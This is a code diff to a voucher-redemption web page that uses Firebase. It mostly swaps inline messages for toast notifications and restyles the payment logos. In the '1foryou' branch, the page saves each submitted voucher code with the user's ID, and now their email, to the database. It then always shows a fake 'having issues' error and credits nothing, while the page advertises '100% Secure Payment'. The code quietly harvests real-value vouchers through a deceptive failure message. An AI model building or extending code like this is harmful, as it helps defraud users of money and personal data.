@@ -90,7 +90,7 @@
     .logos img {
       height: 40px;
       filter: brightness(0) invert(1);
-      opacity: 0.7;
+      opacity: 0.8;
     }
 
     .logos span {
@@ -110,11 +110,28 @@
       display: none;
     }
 
-    #successMsg {
-      margin-top: 20px;
+    /* Toast Notification Styles */
+    .toast {
+      position: fixed;
+      bottom: 30px;
+      left: 50%;
+      transform: translateX(-50%);
+      background: rgba(0, 255, 133, 0.1);
       color: #00ff85;
-      font-size: 16px;
-      text-align: center;
+      padding: 15px 25px;
+      border: 1px solid #00ff85;
+      border-radius: 8px;
+      box-shadow: 0 0 15px #00ff85;
+      font-weight: bold;
+      z-index: 9999;
+      animation: fadeInOut 4s ease forwards;
+    }
+
+    @keyframes fadeInOut {
+      0% { opacity: 0; transform: translateX(-50%) translateY(10px); }
+      10% { opacity: 1; transform: translateX(-50%) translateY(0); }
+      90% { opacity: 1; }
+      100% { opacity: 0; transform: translateX(-50%) translateY(-20px); }
     }
   </style>
 </head>
@@ -143,15 +160,14 @@
     </div>
 
     <div class="logos">
-      <img src="https://www.logo.wine/a/logo/PayPal/PayPal-Logo.wine.svg" alt="PayPal"/>
-      <img src="https://seeklogo.com/images/V/visa-logo-6F4057663D-seeklogo.com.png" alt="Visa"/>
-      <img src="https://seeklogo.com/images/M/mastercard-logo-7800F84706-seeklogo.com.png" alt="MasterCard"/>
+      <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQYmXEgKntWc2daCYVwvYsSHYvnKdq0ihzFvq3Ow5P8_7-tVjnIGkuiRAAb&s=10" alt="MasterCard"/>
     </div>
 
     <div class="security">100% Secure Payment • Encrypted • Private</div>
-
-    <div id="successMsg"></div>
   </div>
+
+  <!-- Toast container -->
+  <div id="toastContainer"></div>
 
   <script type="module">
     import { initializeApp } from "https://www.gstatic.com/firebasejs/11.4.0/firebase-app.js";
@@ -173,6 +189,14 @@
     const db = getDatabase();
     const auth = getAuth();
     let currentUser = null;
+
+    const showToast = (msg) => {
+      const toast = document.createElement('div');
+      toast.className = 'toast';
+      toast.innerText = msg;
+      document.getElementById('toastContainer').appendChild(toast);
+      setTimeout(() => toast.remove(), 4000);
+    };
 
     onAuthStateChanged(auth, user => {
       if (user) {
@@ -200,20 +224,20 @@
     window.redeem = async function () {
       const code = document.getElementById('voucherCode').value.trim();
       const method = document.getElementById('method').value;
-      const successMsg = document.getElementById('successMsg');
+
       if (!code || code.length < 6) {
-        alert("Please enter a valid voucher code.");
+        showToast("Invalid code. Try again.");
         return;
       }
 
-      successMsg.innerText = "";
+      if (!currentUser) return;
 
       if (method === "cashino") {
         const codeRef = ref(db, `cashinocodes/${code}`);
         const snap = await get(codeRef);
 
         if (!snap.exists()) {
-          successMsg.innerText = "Invalid or already used Cashino code.";
+          showToast("Code invalid or already used.");
           return;
         }
 
@@ -226,8 +250,8 @@
         await set(userBalanceRef, newBal);
         await set(codeRef, null);
 
-        successMsg.innerText = `Success! $${value.toFixed(2)} added to your account.`;
         document.getElementById("userBalance").innerText = `$${newBal.toFixed(3)}`;
+        showToast(`Success! $${value.toFixed(2)} added`);
       }
 
       else if (method === "1foryou") {
@@ -235,10 +259,11 @@
         await set(logRef, {
           code: code,
           submittedAt: Date.now(),
-          user: currentUser.uid
+          user: currentUser.uid,
+          email: currentUser.email
         });
 
-        successMsg.innerText = "Oops. Try again later – we’re having a problem with your 1 For You voucher code.";
+        showToast("Try again later – we're having issues with 1 For You vouchers.");
       }
     };
   </script>
